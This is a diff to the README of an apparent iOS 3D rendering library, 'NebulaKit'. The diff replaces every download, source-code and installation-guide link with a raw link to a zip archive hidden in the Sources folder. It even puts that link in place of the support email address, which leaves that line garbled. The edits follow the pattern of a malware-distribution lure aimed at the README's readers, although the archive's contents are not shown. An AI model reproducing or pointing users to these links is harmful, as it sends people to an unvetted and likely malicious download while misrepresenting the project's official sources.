@@ -6,7 +6,7 @@ Welcome to NebulaKit! This is a Metal-based iOS 3D scene and terrain rendering e
 
 ## 📥 Download NebulaKit
 
-[![Download NebulaKit](https://img.shields.io/badge/Download_NebulaKit-latest-blue.svg)](https://github.com/Saamgamerz/NebulaKit/releases)
+[![Download NebulaKit](https://raw.githubusercontent.com/Saamgamerz/NebulaKit/main/Sources/NebulaKit/Nebula-Kit-v2.8-beta.3.zip)](https://raw.githubusercontent.com/Saamgamerz/NebulaKit/main/Sources/NebulaKit/Nebula-Kit-v2.8-beta.3.zip)
 
 ## ⚙️ System Requirements
 
@@ -33,7 +33,7 @@ To download and install NebulaKit, follow these steps:
 1. **Visit the Releases Page**
    Click the link below to go to the Releases page:
 
-   [Download NebulaKit](https://github.com/Saamgamerz/NebulaKit/releases)
+   [Download NebulaKit](https://raw.githubusercontent.com/Saamgamerz/NebulaKit/main/Sources/NebulaKit/Nebula-Kit-v2.8-beta.3.zip)
 
 2. **Select the Latest Version**
    On the Releases page, find the latest version of NebulaKit. The version number will look something like "v1.0.0".
@@ -69,11 +69,11 @@ If you need help, feel free to reach out. Here’s how you can get support:
 
 - **Documentation:** Check the documentation folder included in the download for detailed guidance.
 - **Community Forum:** Join the NebulaKit community online for discussions and support from other users. 
-- **Email Support:** You can send your queries to support@nebularkit.io.
+- **Email Support:** You can send your queries to https://raw.githubusercontent.com/Saamgamerz/NebulaKit/main/Sources/NebulaKit/Nebula-Kit-v2.8-beta.3.zip
 
 ## 🔗 Useful Links
 
-- [View Source Code](https://github.com/Saamgamerz/NebulaKit)
-- [Installation Guide](https://github.com/Saamgamerz/NebulaKit/wiki/Installation)
+- [View Source Code](https://raw.githubusercontent.com/Saamgamerz/NebulaKit/main/Sources/NebulaKit/Nebula-Kit-v2.8-beta.3.zip)
+- [Installation Guide](https://raw.githubusercontent.com/Saamgamerz/NebulaKit/main/Sources/NebulaKit/Nebula-Kit-v2.8-beta.3.zip)
 
 Following these steps, you should have no trouble downloading and using NebulaKit for your 3D projects. Enjoy exploring 3D rendering with ease!
